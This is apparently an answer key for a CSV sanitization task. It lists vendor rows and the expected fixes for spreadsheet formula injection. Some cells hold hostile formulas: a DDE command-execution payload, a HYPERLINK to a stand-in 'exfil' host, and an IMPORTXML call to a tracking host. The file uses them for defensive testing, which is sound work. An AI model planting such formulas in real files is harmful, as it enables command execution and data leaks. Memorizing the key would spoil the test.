@@ -1,0 +1,88 @@
+{
+  "exec_file_sha256": {
+    "vendors.csv": "96f98a57b11d99cd15c719114f9d680b2ab1a796a54e33a19fd817c8aad8be22",
+    "sanitization_policy.md": "bca0ffb8cc029bd0a14e52885c9dd236e475af7567381d9a0a8f06e241152745"
+  },
+  "columns": [
+    "vendor_id",
+    "name",
+    "contact",
+    "note",
+    "account_ref"
+  ],
+  "expected_rows": [
+    [
+      "V-1001",
+      "Northwind Paper",
+      "ap-team@northwind.example.invalid",
+      "'=cmd|'/C calc'!A0",
+      "PO-7781"
+    ],
+    [
+      "V-1002",
+      "Blue Harbor Logistics",
+      "ops@blueharbor.example.invalid",
+      "regular warehouse pickup",
+      "'-SUM(A1:A2)"
+    ],
+    [
+      "V-1003",
+      "Summit Foods",
+      "billing@summit.example.invalid",
+      "' +HYPERLINK(\"http://exfil.example.invalid\",\"click\")",
+      "SAFE-204"
+    ],
+    [
+      "V-1004",
+      "Equal Goods",
+      "equal@example.invalid",
+      "'@IMPORTXML(\"https://track.example.invalid\",\"//x\")",
+      "Normal note"
+    ],
+    [
+      "V-1005",
+      "A-Frame Supplies",
+      "orders@aframe.example.invalid",
+      "starts with dash in name is fine",
+      "REF-001"
+    ]
+  ],
+  "risk_changes": [
+    {
+      "row_number": 2,
+      "column": "note",
+      "original_value": "=cmd|'/C calc'!A0",
+      "risk_type": "formula_injection",
+      "sanitized_value": "'=cmd|'/C calc'!A0",
+      "action": "prefixed_single_quote"
+    },
+    {
+      "row_number": 3,
+      "column": "account_ref",
+      "original_value": "-SUM(A1:A2)",
+      "risk_type": "formula_injection",
+      "sanitized_value": "'-SUM(A1:A2)",
+      "action": "prefixed_single_quote"
+    },
+    {
+      "row_number": 4,
+      "column": "note",
+      "original_value": " +HYPERLINK(\"http://exfil.example.invalid\",\"click\")",
+      "risk_type": "formula_injection",
+      "sanitized_value": "' +HYPERLINK(\"http://exfil.example.invalid\",\"click\")",
+      "action": "prefixed_single_quote"
+    },
+    {
+      "row_number": 5,
+      "column": "note",
+      "original_value": "@IMPORTXML(\"https://track.example.invalid\",\"//x\")",
+      "risk_type": "formula_injection",
+      "sanitized_value": "'@IMPORTXML(\"https://track.example.invalid\",\"//x\")",
+      "action": "prefixed_single_quote"
+    }
+  ],
+  "result_files": [
+    "sanitization_report.json",
+    "vendors_safe.csv"
+  ]
+}
